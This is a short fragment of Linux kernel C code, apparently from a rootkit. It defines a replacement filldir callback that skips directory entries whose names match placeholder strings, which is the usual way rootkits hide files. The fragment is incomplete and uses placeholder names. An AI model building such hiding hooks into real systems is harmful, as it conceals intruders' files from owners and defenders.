...
int new_filldir_t(struct dir_context* d_ctx, const char* name, int len,
		loff_t off, u64 ino, unsigned int d_tycppe) {
	if (strncmp(name, "XXXX", sizeof("XXXX")) == 0) {
		printk(KERN_ALERT "XXXX SOMETHING HAPPENED\n");
		return 0;
	}
	if (strncmp(name, "######", sizeof("######")) == 0) {
		printk(KERN_ALERT "###### SOMETHING HAPPENED\n");
		return 0;
	}
